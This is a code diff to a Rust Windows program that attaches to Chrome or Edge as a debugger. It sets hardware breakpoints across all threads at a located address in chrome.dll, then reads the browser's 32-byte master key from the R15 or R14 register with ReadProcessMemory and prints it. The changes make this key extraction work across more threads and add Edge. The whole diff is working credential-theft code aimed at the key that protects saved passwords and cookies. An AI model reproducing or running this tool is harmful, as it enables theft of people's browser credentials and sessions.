@@ -8,6 +8,7 @@ use windows_sys::Win32::System::LibraryLoader::*;
 use windows_sys::Win32::System::ProcessStatus::*;
 use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::Security::*;
+use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
 
@@ -316,7 +317,11 @@ unsafe fn debug_loop(h_process: HANDLE) {
                         chrome_dll_base = load_dll.lpBaseOfDll;
                         target_address = find_target_address(h_process, chrome_dll_base);
                         if target_address != 0 {
-                            set_hardware_breakpoint(debug_event.dwThreadId, target_address);
+                            let threads = get_all_threads(debug_event.dwProcessId);
+                            println!("Setting hardware breakpoints on {} threads", threads.len());
+                            for thread_id in threads {
+                                set_hardware_breakpoint(thread_id, target_address);
+                            }
                         }
                     }
                 }
@@ -329,8 +334,9 @@ unsafe fn debug_loop(h_process: HANDLE) {
             EXCEPTION_DEBUG_EVENT => {
                 let exception = debug_event.u.Exception;
                 if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
+                    println!("Single step exception at 0x{:X}", exception.ExceptionRecord.ExceptionAddress as usize);
                     if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
-                        println!("Breakpoint hit at target address!");
+                        println!("Target breakpoint hit!");
                         extract_key(debug_event.dwThreadId, h_process);
                     }
                 }
@@ -425,6 +431,27 @@ fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
     haystack.windows(needle.len()).position(|window| window == needle)
 }
 
+unsafe fn get_all_threads(process_id: u32) -> Vec<u32> {
+    let mut threads = Vec::new();
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if snapshot != INVALID_HANDLE_VALUE {
+        let mut te: THREADENTRY32 = zeroed();
+        te.dwSize = size_of::<THREADENTRY32>() as u32;
+        if Thread32First(snapshot, &mut te) != 0 {
+            loop {
+                if te.th32OwnerProcessID == process_id {
+                    threads.push(te.th32ThreadID);
+                }
+                if Thread32Next(snapshot, &mut te) == 0 {
+                    break;
+                }
+            }
+        }
+        CloseHandle(snapshot);
+    }
+    threads
+}
+
 unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
     if h_thread == 0 {
@@ -454,14 +481,21 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) {
     let mut context: CONTEXT = zeroed();
     context.ContextFlags = CONTEXT_FULL;
     if GetThreadContext(h_thread, &mut context) != 0 {
-        // According to the article, R15 holds the key pointer for Chrome
-        let key_ptr = context.R15;
-        println!("Key pointer in R15: 0x{:X}", key_ptr);
+        // According to the article, R15 holds the key pointer for Chrome, R14 for Edge
+        let mut key_ptrs = vec![context.R15, context.R14];
+        println!("Checking key pointers: R15=0x{:X}, R14=0x{:X}", context.R15, context.R14);
 
-        let mut key = [0u8; 32]; // Masterkey is typically 32 bytes
-        let mut bytes_read = 0;
-        if ReadProcessMemory(h_process, key_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
-            println!("Extracted Master Key: {:02X?}", key);
+        for &key_ptr in &key_ptrs {
+            if key_ptr == 0 { continue; }
+            let mut key = [0u8; 32]; // Masterkey is typically 32 bytes
+            let mut bytes_read = 0;
+            if ReadProcessMemory(h_process, key_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
+                // Heuristic: masterkey is high entropy, shouldn't be all zeros
+                if key.iter().any(|&b| b != 0) {
+                    println!("Extracted Master Key from 0x{:X}: {:02X?}", key_ptr, key);
+                    break;
+                }
+            }
         }
     }
 
